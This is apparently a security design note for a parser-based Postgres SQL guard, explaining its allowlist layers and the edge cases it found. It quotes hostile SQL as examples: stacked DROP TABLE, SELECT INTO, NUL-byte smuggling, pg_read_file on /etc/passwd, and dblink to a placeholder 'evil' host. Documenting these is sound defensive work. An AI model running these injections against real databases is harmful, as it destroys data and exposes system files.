# 03 — Deciding whether SQL is safe

This is the hardest problem in the product, so it is the first thing we built. Everything here was verified by running the parser, not by reasoning about it.

## Why regex and hand-written checks lose

The naive version of this check is a blocklist of words:

```js
if (/\b(insert|update|delete|drop|truncate)\b/i.test(sql)) reject();
```

It fails immediately and in ways that are hard to enumerate: `DELETE` appears inside a legitimate string literal (`WHERE action = 'delete'`), comments hide keywords, `SELECT ... INTO` writes without using any blocked word, and dollar-quoted strings can contain anything at all. You cannot pattern-match a language with a grammar. You need the grammar.

`pgsql-parser` gives us the real one: `libpg_query` is Postgres's own parser, extracted from the server source and compiled to WebAssembly. When it says a string is a `SelectStmt`, that is the same judgement the database will make. There is no second, subtly different implementation to disagree with.

Its whole dependency tree is seven packages, all from one org. That matters for a security kernel — a reviewer can audit the footprint in a minute.

## Finding 1: the parser is happy to hand you two statements

```
parseSync('SELECT 1; DROP TABLE users')  ->  stmts.length === 2
```

No error. No warning. A program with two statements in it.

If the guard inspects `stmts[0]` and returns a verdict, the `DROP` is never examined — and if the caller then hands the *original string* to the database, it runs. This is stacked-query injection, and the defence is one line:

```
if (stmts.length !== 1) deny('E_MULTI_STATEMENT')
```

Note we deny even `SELECT 1; SELECT 2`, where both statements are harmless reads. The hazard is permitting multiple statements at all; once you do, you own the problem of proving every one of them is safe. Refusing the shape is cheaper and does not decay.

A related discovery: `SELECT 1;;` parses to **one** statement. Postgres discards empty statements. Our first attack-corpus entry asserted a vulnerability that does not exist, and the test suite caught our mistake rather than the code's. That is the corpus doing its job in the opposite direction from the one we expected.

## Finding 2: node tags are the keys, and unknown keys must mean "no"

The AST is a tree of single-key objects, where the key is the node type:

```json
{"stmts":[{"stmt":{"SelectStmt":{"targetList":[{"ResTarget":{...}}]}}}]}
```

So validation is a walk that checks every capitalised key against a set. The question is which direction the set points.

A **denylist** says "reject `DeleteStmt`, `CopyStmt`, `DoStmt`, ...". It works until Postgres 18 adds a node type nobody has heard of, someone bumps the parser in a routine dependency update, and that node is not on the list — so it passes. Nothing fails. No test goes red. The hole opens silently, during maintenance, months after anyone thought about security.

An **allowlist** says "permit `SelectStmt`, `ColumnRef`, `A_Expr`, ...". The same dependency bump now produces a *deny* and a loud test failure. Someone reads the new node type, decides, and adds it deliberately.

Both lists are incomplete. The difference is entirely in which direction they fail when they are wrong. Choose the direction where being wrong is visible.

We derived the initial allowlist empirically — parsed a corpus of realistic analytics queries, collected every tag that actually appeared, then reviewed that set by hand. Twenty-eight tags covered everything from window functions to grouping sets. Guessing would have produced a longer list with both gaps and dead entries.

## Finding 3: the dangerous part is not always tagged

This is the one that would have shipped a hole.

Not every struct in the AST gets a node tag. Fields whose type is a plain struct rather than a `Node*` are **inlined without a wrapper**:

| Source | Expected | Actual |
|---|---|---|
| `WITH …` | `{WithClause:…}` | `{ctes:[…]}` |
| `t AS x` | `{Alias:…}` | `{aliasname:'x'}` |
| `OVER (…)` | `{WindowDef:…}` | `{orderClause:…}` |
| `::numeric` | `{TypeName:…}` | `{names:[…]}` |

Harmless on their own. Then consider:

```
SELECT * INTO exfil FROM users
```

That statement **creates a table**. Here is every tag a tag-walk sees:

```
A_Star  ColumnRef  RangeVar  ResTarget  SelectStmt
```

All five are on the legitimate allowlist. Structurally it is indistinguishable from `SELECT * FROM users`. The write lives in `SelectStmt.intoClause`, an untagged inlined struct that a tag-only walk never inspects.

Compare `SELECT * FROM users FOR UPDATE`, which *does* surface a `LockingClause` tag and would be caught. The two hazards are not symmetric, which is exactly why you cannot reason your way to this — you have to look.

So the walk also allowlists **field names per tag**. `SelectStmt`'s legitimate fields are `targetList`, `fromClause`, `whereClause`, `groupClause`, and so on. Neither `intoClause` nor `lockingClause` is among them, so both are denied by absence rather than by anyone having remembered them.

## Finding 4: legal structure, illegal meaning

Run the attack corpus and the legitimate corpus through the tag collector and compare. Some tags appear in both:

```
A_Const  A_Star  ColumnRef  FuncCall  List  RangeVar  ResTarget  SelectStmt  String
```

`SELECT pg_read_file('/etc/passwd')` and `SELECT dblink('host=evil','…')` use **only** tags that legitimate queries also use. They are structurally perfect. The danger is in the function *name*, which is data inside a `FuncCall`, not structure.

So there is a third layer: an allowlist of function names. About 120 entries covering aggregates, window functions, date maths, string and numeric operations. `pg_read_file`, `dblink`, `pg_sleep`, `lo_import`, `set_config` and `query_to_xml` are not denied — they are simply not present, which is the same posture as everywhere else.

Schema qualification does not launder anything: `pg_catalog.pg_read_file` resolves to the same last element, and any schema other than `pg_catalog` is refused outright.

## Finding 5: the parser is written in C, and C strings end at NUL

Found by accident. A test file picked up a stray NUL byte, which surfaced two separate problems.

The first was tooling: **git treats a file containing a NUL as binary**. No diff, no line-by-line review. For the security kernel and its test suite — files specifically gated behind CODEOWNERS review — that silently defeats the review requirement. There is now a test asserting no source file contains a raw NUL.

The second was behavioural:

    guard('SELECT 1' + NUL + '; DROP TABLE users')  ->  ALLOW, sql: "SELECT 1"

`libpg_query` is Postgres C code compiled to WebAssembly, so the string ends at the NUL. The parser genuinely never sees the tail. It reports one statement, and it is right about the statement it was given.

Is that exploitable? **Not as designed** — and the reason is worth stating precisely. The verdict carries SQL re-emitted from the validated tree, which is `SELECT 1`. The `DROP` is not in the AST, so it cannot be in the output. A caller executing `v.sql` is safe.

That is the deparse-our-own-tree rule doing exactly the job it exists for, on an attack nobody anticipated.

But it now denies anyway, with `E_NUL_BYTE`. Two reasons. The guard was accepting an input whose meaning differed from what it validated, which is precisely the thing a guard should refuse to do quietly. And its safety depended entirely on every present and future caller using `v.sql` rather than the original string — a one-line refactor away from being wrong. Defences that hold only while everyone downstream stays disciplined are not defences.

The general lesson: **know what your dependencies are written in.** A WebAssembly-compiled C parser inherits C's string semantics, and that leaks through an API that otherwise looks like ordinary JavaScript.

## The three layers

Each catches something the others structurally cannot:

| Layer | Catches | Example it alone stops |
|---|---|---|
| Statement shape | wrong root, stacked statements | `SELECT 1; DROP TABLE users` |
| Node tag allowlist | writes anywhere in the tree | `WITH x AS (DELETE …) SELECT * FROM x` |
| Field allowlist | untagged inlined structs | `SELECT * INTO exfil FROM users` |
| Function allowlist | legal structure, hostile call | `SELECT pg_read_file('/etc/passwd')` |

Remove any one and a whole category walks through.

## Two rules about the shape of the API

**`guard()` returns a verdict; it never throws.** An exception is a bypass waiting for somebody's `try/catch` — and the catch block that swallows it will be written a year from now by someone who has never read this file. Parse failure, unknown node, internal error: all become `{ ok: false, code, detail }`. The type system then forces the caller to handle the deny branch before it can reach `.sql`.

**The guard cannot execute.** It takes a string and returns a string. It has no database handle, no socket, no filesystem. That is enforced in CI by dependency-cruiser, not by convention — try to `import 'node:fs'` into the kernel and the build fails.

## Execute our SQL, never theirs

The verdict does not carry the caller's string back. It carries SQL *re-emitted from the tree we validated*:

```
parse(input) -> tree -> validate(tree) -> deparse(tree) -> re-parse -> re-validate
```

If any character of the input was not represented in the tree we inspected, it cannot survive a deparse of that tree. Whatever obfuscation, encoding trick or comment was in the original is gone, because it was never in the AST.

The re-parse-and-re-validate step is the proof. Rather than comparing two ASTs field by field — which needs `location` offsets stripped and is easy to get subtly wrong — we simply run the emitted SQL back through the entire guard and require that it passes too. Stronger, and much harder to implement incorrectly.

## Calibrating the depth limit

The walk needs a recursion bound. Our first guess was 60, and the test for it was wrong in an instructive way:

```
SELECT ((((((… 400 parens …))))))   ->   AST depth 11
```

Postgres collapses redundant parentheses. Depth comes from nested subqueries, nested function calls and long binary-operator chains — not punctuation. So we measured instead of guessed:

- legitimate corpus: median depth **15**, max **24**
- a deliberately hairy three-CTE dashboard query: **32**

The limit is now 100 — roughly 3× the worst realistic query, and far below anything that could exhaust the stack. Numbers you measured beat numbers you picked, and the measurement is cheap.

## What this does not do

Worth being precise, because a security component that overstates its scope is worse than one that does not exist.

The guard reasons about SQL text. It does **not** know:

- whether `ik_reader` actually lacks write grants (that is `ik doctor --prove-isolation`)
- whether a view or function the query touches has side effects (that is the role and the read-only transaction)
- whether the caller is allowed to see the rows returned (that is RLS, applied from the viewer's token)

It is one of four independent defences, and it is the only one that runs before the database is touched at all. Defence in depth means none of them is load-bearing alone.
